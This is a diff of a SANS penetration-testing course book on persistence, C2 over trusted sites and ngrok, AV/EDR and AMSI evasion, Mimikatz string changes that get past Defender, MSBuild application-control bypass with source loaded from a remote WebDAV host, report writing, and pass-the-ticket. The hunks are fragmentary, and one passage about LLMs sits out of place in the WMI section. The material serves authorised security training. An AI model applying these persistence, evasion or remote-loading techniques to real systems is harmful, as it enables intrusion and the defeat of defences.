@@ -4,7 +4,7 @@
 
 # Persistence and Evading Controls
 
-![](_page_0_Picture_3.jpeg)
+![](SEC560_Book5_page_0_Picture_3.jpeg)
 
 © 2025 SANS Institute. All rights reserved to SANS Institute.
 
@@ -38,19 +38,19 @@ Governing Law: This CLA shall be governed by the laws of the State of Maryland, 
 
 Courseware licensed to User under this CLA may be subject to export laws and regulations of the United States of America and other jurisdictions. User warrants he or she is not listed (i) on any sanction programs list maintained by the U.S. Office of Foreign Assets Control within the U.S. Treasury Department ("OFAC"), or (ii) denied party list maintained by the U.S. Bureau of Industry and Security within the U.S. Department of Commerce ("BIS"). User agrees to not allow access to any Courseware to any person or entity in a U.S. embargoed country or in violation of a U.S. export control law or regulation. User agrees to cooperate with SANS Institute as necessary for SANS Institute to comply with export requirements and recordkeeping required by OFAC, BIS or other governmental agency.
 
-![](_page_2_Picture_0.jpeg)
+![](SEC560_Book5_page_2_Picture_0.jpeg)
 
-![](_page_2_Picture_1.jpeg)
+![](SEC560_Book5_page_2_Picture_1.jpeg)
 
 # **Persistence and Evading Controls**
 
 ENTERPRISE PENETRATION TESTING
 
-![](_page_3_Figure_0.jpeg)
+![](SEC560_Book5_page_3_Figure_0.jpeg)
 
-![](_page_4_Figure_0.jpeg)
+![](SEC560_Book5_page_4_Figure_0.jpeg)
 
-![](_page_5_Picture_2.jpeg)
+![](SEC560_Book5_page_5_Picture_2.jpeg)
 
 # **Course Roadmap**
 
@@ -93,7 +93,7 @@ Lab 5.5: Silver Ticket
 - Running Commands on Azure
 - Permissions on Azure
 
-![](_page_6_Picture_1.jpeg)
+![](SEC560_Book5_page_6_Picture_1.jpeg)
 
 # **Why Persistence**
 
@@ -118,9 +118,9 @@ Common persistence methods include registry changes, writing to startup folders,
 - https://persistence-info.github.io
 - https://twitter.com/vysecurity/status/1600013028615147520
 
-![](_page_7_Picture_0.jpeg)
+![](SEC560_Book5_page_7_Picture_0.jpeg)
 
-![](_page_7_Picture_1.jpeg)
+![](SEC560_Book5_page_7_Picture_1.jpeg)
 
 # **Registry**
 
@@ -140,7 +140,7 @@ One common location for persistence in the registry is the HKCU (Current User) s
 
 Another way to use the registry for persistence is through the CMD.EXE AutoRun key. CMD.EXE is the command-line interpreter in Windows, and it looks for registry variables to execute first when it starts. The HKCU\Software\Microsoft\Command Processor\AutoRun key is used to run a command or program automatically every time CMD.EXE starts. The HKCU Load key is an older method of using the registry for persistence, but it is still supported in modern Windows operating systems.
 
-![](_page_8_Picture_1.jpeg)
+![](SEC560_Book5_page_8_Picture_1.jpeg)
 
 # **Startup Folder**
 
@@ -181,7 +181,7 @@ C:\> schtasks /query /s [targetIP]
 
 The schtasks /query command shows all items scheduled through the scheduler service.
 
-![](_page_10_Picture_2.jpeg)
+![](SEC560_Book5_page_10_Picture_2.jpeg)
 
 # **Services**
 
@@ -197,9 +197,9 @@ Services are powerful persistence tools because they are background processes th
 
 Since service creation is heavily monitored, OPSEC is critical. Creating a randomly-named service is poor practice. A good approach is to create a service that blends in with others on the host. A very good option is hijacking an existing service through methods like DLL search order hijacking or by modifying its executable.
 
-![](_page_11_Picture_0.jpeg)
+![](SEC560_Book5_page_11_Picture_0.jpeg)
 
-![](_page_11_Picture_1.jpeg)
+![](SEC560_Book5_page_11_Picture_1.jpeg)
 
 #### **WMI Event Consumer**
 
@@ -213,7 +213,7 @@ WMI (Windows Management Instrumentation) event subscription is a feature in the 
 
 This advanced trigger event allows for remote triggering of code execution via any authentication protocol, such as Remote Desktop, PsExec, local runas, and others. By using WMI event subscriptions, an attacker can establish persistence on a target system and execute code whenever a specified event occurs, allowing them to maintain control over the compromised system.
 
-![](_page_12_Figure_0.jpeg)
+![](SEC560_Book5_page_12_Figure_0.jpeg)
 
 Understanding how machine learning, and particularly Large Language Models (LLMs) like ChatGPT, learn is crucial for grasping their capabilities and limitations. The process is analogous to how humans learn language. When humans begin to learn language, they don't start with grammar rules. Instead, they listen to countless examples and, over time, reverse-engineer the rules. English, for instance, is notorious for its many exceptions to its own rules, which learners pick up over time through exposure and practice.
 
@@ -233,9 +233,9 @@ In essence, while humans learn from a limited amount of data they're exposed to 
 - An article going into similar depths: https://writings.stephenwolfram.com/2023/02/what-is-chatgptdoing-and-why-does-it-work/
 - ChatGPT shared session from the screenshot: https://chatgpt.com/share/29cf176b-3aee-433a-8ae8- 81d8fb8ae795
 
-![](_page_14_Picture_0.jpeg)
+![](SEC560_Book5_page_14_Picture_0.jpeg)
 
-![](_page_15_Picture_2.jpeg)
+![](SEC560_Book5_page_15_Picture_2.jpeg)
 
 # **Course Roadmap**
 
@@ -286,9 +286,9 @@ Lab 5.5: Silver Ticket
 - Attackers can abuse these sites for C2, exfiltration, hosting payloads, and more −If a victim can cause an observable change, it can be abused for C2
 - Bonus: Removes the requirement for your own public IP/domain
 
-![](_page_16_Picture_6.jpeg)
+![](SEC560_Book5_page_16_Picture_6.jpeg)
 
-![](_page_16_Picture_7.jpeg)
+![](SEC560_Book5_page_16_Picture_7.jpeg)
 
 The Living Off Trusted Sites (LOTS) project documents the potential for attackers to use third-party trusted infrastructure instead of providing their own. This helps the traffic to better blend into environments (imagine exfiltrating data via Dropbox instead of via a DigitalOcean C2 server) as well as removes the need for the attacker to provide their own infrastructure. Since the attacker is now one step removed from what the victim sees, this can also make the defender's job of attribution more difficult.
 
@@ -303,13 +303,13 @@ The Living Off Trusted Sites (LOTS) project documents the potential for attacker
   - − Always remember to encrypt payloads and communications
   - − Never treat providers as you would a VPN
 
-![](_page_17_Picture_7.jpeg)
+![](SEC560_Book5_page_17_Picture_7.jpeg)
 
 to expose local or internal services to the internet. The heart of the ngrok system is the ngrok agent. The agent will connect to the ngrok cloud and provide the end user with a connectivity method. We can leverage ngrok to facilitate connectivity for our implants or backdoors. What's a valid use case for ngrok? How about a service like Google Home or Amazon Alexa? If you wanted to build an application for those systems, you would need to host the code in a way that's reachable by those home assistants. Ngrok can facilitate that access to expose your code from your workstation to the internet in an accessible way. Can this be a security issue? Yes. Can we securely do this? Yes.
 
 We cannot have a directly exposed server to the internet in the next set of labs. Consider what we have been doing in class so far. The servers and clients we have been hacking were laterally available to us; we could connect in both directions because we were effectively behind the firewall or on the same LAN. We do not have access laterally; our systems are behind firewalls and NAT interfaces. We can use ngrok to bypass this restriction.
 
-![](_page_18_Picture_2.jpeg)
+![](SEC560_Book5_page_18_Picture_2.jpeg)
 
 #### **How Does It Work?**
 
@@ -342,7 +342,7 @@ The third type of tunnel is rather interesting. Instead of establishing a connec
 
 You start the agent by typing **ssh -R 80:localhost:80 tunnel.us.ngrok.io http**. Notice that the **http** part is running on the remote ngrok cloud, as if it were a command.
 
-![](_page_19_Picture_0.jpeg)
+![](SEC560_Book5_page_19_Picture_0.jpeg)
 
 To create a connection using ngrok, we follow a flow that will establish the listener connection. On the tester workstation, you will need to have the ngrok client and, in this example, the listening service. Our first step will be to turn on a listening server, which is a Python web server in this example:
 
@@ -356,13 +356,13 @@ The command we are running will connect to the ngrok cloud to establish a connec
 
 Pay attention to the window that ngrok keeps open for agent connection. There are several items we want to focus on. The first one is the redirection addresses we are given. We will be given both an HTTP and HTTPS address for an HTTP listener. The addresses you see ending in ngrok.io are available on the internet. You may also see a local ngrok listener on port 4040 that will serve as a logging system. At the bottom of the screen, you will see diagnostic information. For TCP-only connections, you will see open and closed sessions. For HTTP connections, you will see the URLs that have been requested. This is helpful for troubleshooting connectivity.
 
-![](_page_20_Figure_0.jpeg)
+![](SEC560_Book5_page_20_Figure_0.jpeg)
 
 This graphic depicts how ngrok works to provide tunnels bypassing restrictions. Ngrok itself is an agent. The agent offers a full TCP tunnel connection to the ngrok cloud. TCP traffic is bidirectional, which means that having an open connection outbound from your machine to the cloud will establish a firewall connection and a NAT connection. This act will bypass restrictions that both NAT and firewalling offer. Once the connection is established, the ngrok system will forward traffic that it receives to your connection.
 
 In the above graphic, the agent connection is started by typing the following command: **ngrok HTTP 443**. This will open a connection outbound to the ngrok system. The ngrok system will provide the HTTP URL to the agent that an external third party can connect to in order to send data back to the ngrok agent. The far-end system goes to the following URL: HTTP://abc123.ngrok.io. This will send traffic to the ngrok cloud, which gets redirected back to the agent listening for a connection. Whatever is listening on that device's interfaces on port 443 will now be reachable over the internet. If this is an implant or a netcat shell, you will receive the connection from the internet to your device. Since our labs are in Azure, this will help us perform our attacks.
 
-![](_page_21_Picture_2.jpeg)
+![](SEC560_Book5_page_21_Picture_2.jpeg)
 
 # **Course Roadmap**
 
@@ -452,7 +452,7 @@ Another quite effective approach is to simply ask. Target system personnel may t
 
 Once you've determined which antivirus product(s) the target organization is using, you should procure a copy of as close a version as you can and install it in your lab. Then, build multiple malicious files and see how each performs against the target organization's antivirus tool in your lab. Choose the best one and use it for your attack on that penetration test.
 
-![](_page_24_Figure_0.jpeg)
+![](SEC560_Book5_page_24_Figure_0.jpeg)
 
 − Rather self-defeating for pen testers
 
@@ -462,7 +462,7 @@ AV/EDR vendors and all customers
   - − These sites appear and disappear frequently
   - − You are better off buying a copy of the target's AV tool
 
-![](_page_24_Picture_5.jpeg)
+![](SEC560_Book5_page_24_Picture_5.jpeg)
 
 Some people think that an effective way to evade antivirus tools is to use the virustotal.com website, which hosts more than 50 different antivirus tools and enables users to upload files to see which AV tool detects the file as malware. It can indeed be exciting to formulate a malicious executable, upload it to virustotal.com, and see that zero or only two to five antivirus tools out of 50+ products detected it as malware.
 
@@ -472,7 +472,7 @@ It should be noted that virustotal.com does include a search utility, so you can
 
 Several other online antivirus scanners are available in addition to virustotal.com, some of which have a policy of NOT sharing with antivirus vendors. However, these smaller sites tend to appear and then disappear after a few months and often do not host the most popular enterprise antivirus solutions. Therefore, you are usually better off buying a copy of the target's antivirus tool and running it in your laboratory rather than using these services, especially virustotal.com.
 
-![](_page_25_Picture_2.jpeg)
+![](SEC560_Book5_page_25_Picture_2.jpeg)
 
 # **AV/EDR Evasion**
 
@@ -500,7 +500,7 @@ Static analysis is easy to write rules against. Defensive tool developers can lo
 
 Dynamic analysis looks at what the process does and determines if it is a normal user action. Since there are so many different users and software packages, it can be difficult to properly tune these types of detections and cause many false positives. False positives can overwhelm a security team, but more importantly, they could impair or break critical business processes.
 
-![](_page_26_Picture_1.jpeg)
+![](SEC560_Book5_page_26_Picture_1.jpeg)
 
 #### **AMSI**
 
@@ -531,7 +531,7 @@ While this additional visibility is very useful for defensive tools, it still is
 
 • https://redsiege.com/560/amsi-help
 
-![](_page_27_Picture_2.jpeg)
+![](SEC560_Book5_page_27_Picture_2.jpeg)
 
 # **AMSI Initialization in PowerShell**
 
@@ -543,7 +543,7 @@ When a new PowerShell process is created, the AMSI dll (C:\Windows\System32\amsi
 
 AMSI is initialized by calling the ScanContent() function. If initialization fails, the PowerShell script will continue to execute. Some AMSI bypasses patch the AMSI DLL in memory, causing ScanContent to return an error, allowing script execution to continue. Other bypasses work by disabling the AmsiScanBuffer() function. If this function is disabled, AMSI is effectively disabled, allowing a malicious script to be executed.
 
-![](_page_28_Picture_1.jpeg)
+![](SEC560_Book5_page_28_Picture_1.jpeg)
 
 # **Bypassing AMSI: AMSI Initialization**
 
@@ -581,7 +581,7 @@ Because AMSI was introduced in PowerShell version 3, previous versions of PowerS
 
 AMSI bypasses can be used to allow our attack scripts to run on systems. Of course, we still must contend with AV/EDR agents on a system.
 
-![](_page_30_Picture_1.jpeg)
+![](SEC560_Book5_page_30_Picture_1.jpeg)
 
 # **Bypassing AMSI: String Modification**
 
@@ -589,7 +589,7 @@ Different character encodings, string concatenation, and manipulation can all le
 
 AV vendors attempt to block malicious code by analyzing static indicators like strings. In this example, Windows Defender attempts to block scripts containing the word "Invoke-Mimikatz", used in the PowerShell implementation of Mimikatz. Using a string with the content "Invoke-Mimikatz" is blocked. However, by concatenating the string together, each part isn't considered malicious, thus bypassing AMSI detective controls.
 
-![](_page_31_Picture_1.jpeg)
+![](SEC560_Book5_page_31_Picture_1.jpeg)
 
 # **Static Analysis Evasion**
 
@@ -598,7 +598,7 @@ Certain strings are associated with "good" and "bad" software.
 - **Bad:** "Copyright Benjamin Delpy" (the creator of Mimikatz)
 - **Good:** "SteamGameServer\_RunCallbacks" (from video games)
 
-![](_page_31_Picture_6.jpeg)
+![](SEC560_Book5_page_31_Picture_6.jpeg)
 
 Certain strings (text) in a file (typically executable or script) are signatured as being bad. Defensive tools will key in on those strings and flag the file as malicious. To make better choices and to lower the rate of false positives, the tools will also detect good strings from known good files. The two metrics are combined to give the file a final score.
 
@@ -608,9 +608,9 @@ Researchers from Skylight Cyber took the strings from Rocket League, a (quite fu
 
 The full article is available at https://redsiege.com/560/cy-kill.
 
-![](_page_32_Picture_0.jpeg)
+![](SEC560_Book5_page_32_Picture_0.jpeg)
 
-![](_page_32_Picture_1.jpeg)
+![](SEC560_Book5_page_32_Picture_1.jpeg)
 
 # **Stripping PowerShell Comments**
 
@@ -699,28 +699,28 @@ We'll look at how to use this process to get a payload working on a system with 
 
 • https://github.com/matterpreter/DefenderCheck
 
-![](_page_36_Figure_0.jpeg)
+![](SEC560_Book5_page_36_Figure_0.jpeg)
 
 To start with, we'll take the stock, unmodified Mimikatz binary and use DefenderCheck to find out if Defender thinks this binary is malicious. No surprise here. Defender has identified this as a threat specifically, "HackTool:Win64/Mikatz!dha." Here, we can see Defender is most likely triggering on something called "mimikatz\_doLocal."
 
-![](_page_37_Figure_0.jpeg)
+![](SEC560_Book5_page_37_Figure_0.jpeg)
 
 Looking at the source code, we can see the offending string, "mimikatz\_doLocal", shows up in two places -Mimikatz.h and Mimikatz.c. It is likely that "mimikatz" is the specific problem rather than the entire string. To test that suspicion, we'll only change "mimikatz\_doLocal", changing it to "mimidogz\_doLocal". After recompiling and retesting, we can see the next thing Defender alerted on appears to be an error string contained in the binary.
 
 Ultimately, many changes were required to get a working payload that was undetected by Defender. These changes included changing many of the commands used to operate Mimikatz (sekurlsa, logonpasswords, credman, etc.), modifying strings used in messages produced by the application, and other changes.
 
-![](_page_38_Figure_0.jpeg)
+![](SEC560_Book5_page_38_Figure_0.jpeg)
 
 Eventually, after many modifications, we compiled a new Mimikatz executable that was undetected by Defender. Several of the modifications are visible here on the slide. The prompt is now "mimidogz" instead of mimikatz, and the executable has been renamed mimidogz. The command used to recover the password hash is "securelsa::loginpasswords" instead of "sekurlsa::logonpasswords". As you can see, with patience and persistence, it is usually possible to bypass signature-based detections.
 
-![](_page_39_Picture_2.jpeg)
+![](SEC560_Book5_page_39_Picture_2.jpeg)
 
 # **Tools for Automating AV/EDR Evasion**
 
 - Metasploit's msfvenom is a useful option, but many AV vendors focus on detecting its output (as with other public tooling)
 - Shellter is a popular commercial tool for penetration testers and red teamers to evade AV/EDR (with an older free edition available)
 
-![](_page_39_Picture_6.jpeg)
+![](SEC560_Book5_page_39_Picture_6.jpeg)
 
 sec560@560vm:~\$ msfvenom --list encoders Name Rank Description ---- ---- ----------- ...some encoders skipped... x64/zutto\_dekiru manual Zutto Dekiru x86/alpha\_mixed low Alpha2 Alphanumeric Mixedcase Encoder x86/shikata\_ga\_nai excellent Polymorphic XOR Additive Feedback ...
 
@@ -734,7 +734,7 @@ Therefore, it is helpful to have other options in addition to msfvenom for antiv
 
 The game of hiding from defensive tools is very fast-paced. When a new bypass is found, the defensive tools close the holes, sometimes in weeks or even days. It is quite uncommon for a long-standing bypass to survive for long, but we have another way.
 
-![](_page_40_Picture_2.jpeg)
+![](SEC560_Book5_page_40_Picture_2.jpeg)
 
 # **Course Roadmap**
 
@@ -803,7 +803,7 @@ Blocking based on location and hash is difficult since simply renaming a file or
 
 Forging a signature is largely infeasible. But what if we could use a known-good, signed executable as a springboard to run the code of our choosing?
 
-![](_page_42_Figure_0.jpeg)
+![](SEC560_Book5_page_42_Figure_0.jpeg)
 
 bypasses are generally much longer lasting. One of the most common techniques to execute arbitrary code is to use a known-good piece of software to launch your custom shellcode.
 
@@ -841,7 +841,7 @@ SEC560 | Enterprise Penetration Testing
 
 43
 
-![](_page_44_Picture_1.jpeg)
+![](SEC560_Book5_page_44_Picture_1.jpeg)
 
 # **Application Control Bypass: MSBuild (2)**
 
@@ -1019,13 +1019,13 @@ return true;
 </Project>
 ```
 
-![](_page_48_Figure_0.jpeg)
+![](SEC560_Book5_page_48_Figure_0.jpeg)
 
 To execute our code, we simply run MSBuild.exe and provide the path to our executable. In the example above, you can see the output "Hello SEC560!"
 
 48
 
-![](_page_49_Picture_1.jpeg)
+![](SEC560_Book5_page_49_Picture_1.jpeg)
 
 # **Application Control Bypass: MSBuild (6)**
 
@@ -1074,9 +1074,9 @@ Source="\\11.22.33.44\webdav\calc.cs">
 - https://redsiege.com/560/msbuild2
 - https://redsiege.com/560/msbuild-remote
 
-![](_page_51_Picture_0.jpeg)
+![](SEC560_Book5_page_51_Picture_0.jpeg)
 
-![](_page_51_Picture_1.jpeg)
+![](SEC560_Book5_page_51_Picture_1.jpeg)
 
 # **Application Control Bypass: MSBuild (8)**
 
@@ -1100,9 +1100,9 @@ If the template itself is not detected as malicious, it's possible that the tech
 - https://docs.microsoft.com/en-us/windows/win32/devnotes/rtlmovememory
 - https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.copy?view=net-5.0
 
-![](_page_52_Picture_0.jpeg)
+![](SEC560_Book5_page_52_Picture_0.jpeg)
 
-![](_page_53_Picture_2.jpeg)
+![](SEC560_Book5_page_53_Picture_2.jpeg)
 
 # **Course Roadmap**
 
@@ -1149,7 +1149,7 @@ Lab 5.5: Silver Ticket
 - Running Commands on Azure
 - Permissions on Azure
 
-![](_page_54_Picture_2.jpeg)
+![](SEC560_Book5_page_54_Picture_2.jpeg)
 
 # **Always Create a Report**
 
@@ -1170,7 +1170,7 @@ Sometimes, testers who perform vulnerability scans of their employers in-house t
 
 In addition, to increase the efficiency of your overall process, you should consider starting to write the report while the test is underway. That way, your reporting process will not take as long, and the overall quality of your results will better reflect the details of your work. As you conduct the test, take notes that follow along with the documented methodology that you use. Grab screenshots that illustrate your findings as you make those findings. When you have significant results, write them up immediately (or at least a bulleted list of their most salient points) while they are still fresh in your mind. You usually don't have to finish the report while the testing is underway. Most penetration tests include a reporting period after the hands-on testing is complete. But this post-testing report time will go much more smoothly and efficiently if you start writing during the test phase.
 
-![](_page_55_Picture_2.jpeg)
+![](SEC560_Book5_page_55_Picture_2.jpeg)
 
 # **Don't Just Regurgitate Vuln Scan Results**
 
@@ -1227,7 +1227,7 @@ Let's look at each section in more detail.
 - Add high-level recommendations
 - Positive findings are a nice touch
 
-![](_page_57_Figure_11.jpeg)
+![](SEC560_Book5_page_57_Figure_11.jpeg)
 
 The Executive Summary is probably the most important section of the entire report. Composing an effective Executive Summary is quite an art form and an important one for testers to master. The purpose of this section of the report is to describe to decision-makers what the results of the report mean—and more importantly, recommendations for the actions they need to take based on its results.
 
@@ -1241,9 +1241,9 @@ Next, the summary covers the overall risk posture of the target environment. Wer
 
 Is the environment worse than expected by testers and/or the people reading the Executive Summary? Or did the test results show that the security of the target environment appeared to be sound?
 
-![](_page_58_Picture_0.jpeg)
+![](SEC560_Book5_page_58_Picture_0.jpeg)
 
-![](_page_58_Picture_1.jpeg)
+![](SEC560_Book5_page_58_Picture_1.jpeg)
 
 # **1. Executive Summary (2)**
 
@@ -1286,7 +1286,7 @@ The table should include each individual's name, role, and contact information, 
 
 These Introduction components of reports are immensely helpful six months after the project or later in analyzing what was tested. Many organizations frequently refer to these Introductions to determine what else in their environment needs to be tested and what needs to be retested.
 
-![](_page_60_Picture_1.jpeg)
+![](SEC560_Book5_page_60_Picture_1.jpeg)
 
 # **3. Findings**
 
@@ -1312,11 +1312,11 @@ Be careful with including the successfully guessed or cracked passwords in your 
 
 In the Technical Findings section n, screenshots that illustrate the issue can be helpful in conveying a lot of information and making the results feel "real." Network diagrams can also go a long way in explaining some technical ideas.
 
-![](_page_62_Picture_0.jpeg)
+![](SEC560_Book5_page_62_Picture_0.jpeg)
 
 61
 
-![](_page_62_Picture_1.jpeg)
+![](SEC560_Book5_page_62_Picture_1.jpeg)
 
 # **Illustrating Findings with Screenshots**
 
@@ -1338,17 +1338,17 @@ Screenshots aren't just eye candy. They can help a report have its intended effe
 
 When including screenshots in your reports, make sure to focus the screenshot on the issue you are illustrating in the prose of your report. Some penetration testers include giant screenshots with a lot of detail distributed around the picture, but only a small portion of the figure is actually meaningful. The crux of your screenshot could be lost amid a sea of other unimportant information in the same figure. Focus your screenshots on the action you want to show, which might be a vulnerability discovered by a scanning tool, a command shell returned by a successful exploit (often running **hostname** to show the machine's name), or other useful items.
 
-![](_page_63_Picture_0.jpeg)
+![](SEC560_Book5_page_63_Picture_0.jpeg)
 
 **Screenshot Elements**
 
 • Augment screenshots with various graphical elements to help focus attention on the most important part
 
-![](_page_63_Picture_3.jpeg)
+![](SEC560_Book5_page_63_Picture_3.jpeg)
 
-![](_page_63_Picture_4.jpeg)
+![](SEC560_Book5_page_63_Picture_4.jpeg)
 
-![](_page_63_Picture_5.jpeg)
+![](SEC560_Book5_page_63_Picture_5.jpeg)
 
 Notation: Use meaningful text to illustrate a point
 
@@ -1357,7 +1357,7 @@ Notation: Use meaningful text to illustrate a point
   - − Be aware of color blindness
 - Black text on a white background is ideal (especially in terminals)
 
-![](_page_63_Picture_11.jpeg)
+![](SEC560_Book5_page_63_Picture_11.jpeg)
 
 SEC560 | Enterprise Penetration Testing
 
@@ -1369,7 +1369,7 @@ Terminals shown in screenshots often work best with black characters on a white 
 
 63
 
-![](_page_64_Picture_2.jpeg)
+![](SEC560_Book5_page_64_Picture_2.jpeg)
 
 #### **Screenshot Tools**
 
@@ -1415,7 +1415,7 @@ Greenshot is a free tool for Windows. It is designed for quick screenshots and a
   - − Use pixel size of 1/2 font height or larger
   - − There are tools to depixelate if your pixels are too small
 
-![](_page_65_Picture_14.jpeg)
+![](SEC560_Book5_page_65_Picture_14.jpeg)
 
 It is very important to properly redact information in reports. Taking safer screenshots is an important first step. Always disable transparency in your terminal windows (and others) when taking a screenshot to avoid information leakage. The author of this course once received a penetration test report from a prominent penetration testing company and learned about the company's other clients because of information leakage due to transparency.
 
@@ -1457,7 +1457,7 @@ Most recommendations in a penetration testing or ethical hacking report fall int
 
 Whenever you make a recommendation, make sure you consider the root cause of the problem. Why is the issue present in the first place? How can target system personnel prevent it from happening again in the same instance or in other related areas? Answer those questions and you'll be providing additional business value for your work.
 
-![](_page_68_Picture_2.jpeg)
+![](SEC560_Book5_page_68_Picture_2.jpeg)
 
 # **Validation and Verification**
 
@@ -1471,7 +1471,7 @@ Provide steps or a method to verify a fix is in place and effective.
 
 If you want to go above and beyond in providing value in your penetration tests, provide in your recommendation some steps an organization can take to verify that your recommended fix is in place and working effectively. For example, if you recommend applying a patch or a filter, provide target system personnel with some command-line activities they can run to verify that the patch is in place or that the filter is properly filtering. Such fix verification advice can be difficult to formulate succinctly, but it provides some extra verification for target system personnel that their defenses have improved because of your work. Might this prevent you from getting some extra follow-on testing work? Yes, that is possible, but it makes your initial test results and report much more valuable to the organization.
 
-![](_page_69_Picture_1.jpeg)
+![](SEC560_Book5_page_69_Picture_1.jpeg)
 
 # **4. Methodology**
 
@@ -1492,7 +1492,7 @@ That demonstrates not only that we conducted a thorough test (again illustrating
 
 The scanning component of the Methodology section should include an inventory of all the machines that were included in the test. We recommend a table with one row per target machine, listing the IP address, machine name(s), associated business unit (if it can be determined), and its method of discovery (DNS, ping sweep, Google searches, and so on). During the recon discussion (560.1), we discussed maintaining this inventory while the test occurs. We can directly use this inventory, in a condensed form, in our final report. For some tests, this inventory can get long and should be moved into optional appendices at the end of the report.
 
-![](_page_70_Picture_1.jpeg)
+![](SEC560_Book5_page_70_Picture_1.jpeg)
 
 # **Appendices**
 
@@ -1520,7 +1520,7 @@ Include other items as they are required or helpful.
   - − https://redsiege.com/560/reports
 - SEC402: Cybersecurity Writing: Hack the Reader
 
-![](_page_72_Picture_1.jpeg)
+![](SEC560_Book5_page_72_Picture_1.jpeg)
 
 # **Sample Reports**
 
@@ -1544,15 +1544,15 @@ Note that the printed book is in black and white. To get the best experience and
 
 • https://redsiege.com/560/reports
 
-![](_page_73_Picture_0.jpeg)
+![](SEC560_Book5_page_73_Picture_0.jpeg)
 
-![](_page_73_Picture_1.jpeg)
+![](SEC560_Book5_page_73_Picture_1.jpeg)
 
 # **Findings Order**
 
-![](_page_73_Picture_3.jpeg)
+![](SEC560_Book5_page_73_Picture_3.jpeg)
 
-![](_page_73_Picture_4.jpeg)
+![](SEC560_Book5_page_73_Picture_4.jpeg)
 
 Findings should be ordered by severity. Why make the reader scroll through less severe findings to find the more critical and important findings? Remember who you are writing the reports for! The consumer of the report wants to be able to quickly triage issues and will likely want to look at the most severe issues first, so put those first in the report.
 
@@ -1561,7 +1561,7 @@ Findings should be ordered by severity. Why make the reader scroll through less 
 - https://github.com/juliocesarfort/public-pentesting-reports/blob/master/ADALogics/Jackson-Report-Shared.pdf
 - https://github.com/juliocesarfort/public-pentestingreports/blob/master/Coinspect/CoinspectReportZcash2016.pdf
 
-![](_page_74_Figure_0.jpeg)
+![](SEC560_Book5_page_74_Figure_0.jpeg)
 
 Be consistent in your reports. In the images above, you can see that the spacing is inconsistent. In the author's experience, some people are really good at detecting things like this and others aren't. It shows a very simple lack of attention to detail, which may make the recipient question what other details were missed. The simple solution here is to use a style (for example, edit the Heading 2 style) that includes the correct spacing before and after, and then the tester never has to press Enter twice. You can even have an automated check look for places where there are two spaces anywhere in the report. This is a very simple style change that takes seconds to implement and fixes all future reports!
 
@@ -1569,7 +1569,7 @@ Be consistent in your reports. In the images above, you can see that the spacing
 
 • https://github.com/juliocesarfort/public-pentestingreports/blob/master/Coinspect/CoinspectReportZcash2016.pdf
 
-![](_page_75_Figure_0.jpeg)
+![](SEC560_Book5_page_75_Figure_0.jpeg)
 
 The reports above show the default formatting. On the left, we see blue underscore links, which were common in the 1990s. A simple style change here would make the report look more modern. On the right, we see the default theme for Microsoft Word. In both cases, using a different theme or changing the basic styles (e.g., links) to something different and more modern makes the report look much fresher and more appealing. Both changes take only a short time and are effective for all future reports and make the report stand out.
 
@@ -1580,7 +1580,7 @@ In addition, in the report on the right, there is white text on a black backgrou
 - https://github.com/juliocesarfort/public-pentestingreports/blob/master/Coinspect/CoinspectReportZcash2016.pdf
 - https://github.com/juliocesarfort/public-pentesting-reports/blob/master/OffensiveSecurity/penetrationtesting-sample-report-2013.pdf
 
-![](_page_76_Figure_0.jpeg)
+![](SEC560_Book5_page_76_Figure_0.jpeg)
 
 The graphs shown here are confusing. The graph on the left is nearly impossible to read and is unreadable when printed. Even if the report were in an electronic format, it is still difficult to navigate. The report shows the graphs but only includes them to show the "complexity of the calculated call graph." This adds little value to the report other than saying it was hard work, especially since the graph is so difficult to read. The other two graphs include colors, but the report does not describe why the colors are used or their significance. When including graphics like this, make sure to zoom in on the important pieces and have a clear reason why you are including them and what you want to convey to the reader.
 
@@ -1588,7 +1588,7 @@ The graphs shown here are confusing. The graph on the left is nearly impossible 
 
 • https://github.com/juliocesarfort/public-pentesting-reports/blob/master/Fraunhofer/Fraunhofer\_- \_TrueCrypt.pdf
 
-![](_page_77_Figure_0.jpeg)
+![](SEC560_Book5_page_77_Figure_0.jpeg)
 
 The executive summary here is very clean and concise. It also looks very professional and high quality. This conveys to the reader that the work is also high quality. The summary has clear headers and is very easy to read. This is an excellent example of a high-quality report!
 
@@ -1596,7 +1596,7 @@ The executive summary here is very clean and concise. It also looks very profess
 
 • https://github.com/juliocesarfort/public-pentestingreports/blob/master/NCCGroup/NCC\_Group\_Zcash\_NU3\_Blossom\_Report\_2020-02-06\_v1.1.pdf
 
-![](_page_78_Figure_0.jpeg)
+![](SEC560_Book5_page_78_Figure_0.jpeg)
 
 Color in reports is useful, but you need to be very careful how you use it. In the left example above, the colors associated with the Medium and Low risk levels are very similar and can be hard for people with Color Vision Deficiencies (CVD) to distinguish. The image would be difficult for nearly everyone in black and white printed form.
 
@@ -1613,7 +1613,7 @@ If you choose to use colors as part of the narrative, be sure to include icons o
 - https://github.com/juliocesarfort/public-pentestingreports/blob/master/NCCGroup/NCC\_Group\_ProtocolLabs\_FilecoinGroth16\_Report\_2021-06-02.pdf
 - https://github.com/juliocesarfort/public-pentesting-reports/blob/master/ProCheckUp/CHECK-1- 2012.pdf
 
-![](_page_79_Figure_0.jpeg)
+![](SEC560_Book5_page_79_Figure_0.jpeg)
 
 In the graph shown above, which corner is the most severe? If you're like most people, you'd expect the most severe issue to be in the top right, but this isn't how the graph is laid out. The corner that would be the biggest risk would be the bottom left (simple attack, highest risk). The bottom left of graphs is usually the origin (0,0), which is what makes this layout so confusing. This graph could mean the reader focuses on the wrong security vulnerability!
 
@@ -1623,7 +1623,7 @@ Think about your readers, how they may read the graph, and what is useful to the
 
 • https://github.com/juliocesarfort/public-pentestingreports/blob/master/iSEC/iSec\_Final\_Open\_Crypto\_Audit\_Project\_TrueCrypt\_Security\_Assessment.p df
 
-![](_page_80_Picture_2.jpeg)
+![](SEC560_Book5_page_80_Picture_2.jpeg)
 
 # **Course Roadmap**
 
@@ -1668,9 +1668,9 @@ Lab 5.5: Silver Ticket
 - Running Commands on Azure
 - Permissions on Azure
 
-![](_page_81_Picture_0.jpeg)
+![](SEC560_Book5_page_81_Picture_0.jpeg)
 
-![](_page_81_Picture_1.jpeg)
+![](SEC560_Book5_page_81_Picture_1.jpeg)
 
 # **Pass-the-Ticket**
 
@@ -1693,7 +1693,7 @@ This ticket can be exported to a file using the Mimikatz command **"kerberos::li
 
 We cannot select the name for the tickets; instead, Mimikatz decides the name based on metadata such as the username. Tickets generated by Mimikatz use the extension .kirbi, but any extension can be used for a pass-the-ticket attack.
 
-![](_page_82_Figure_0.jpeg)
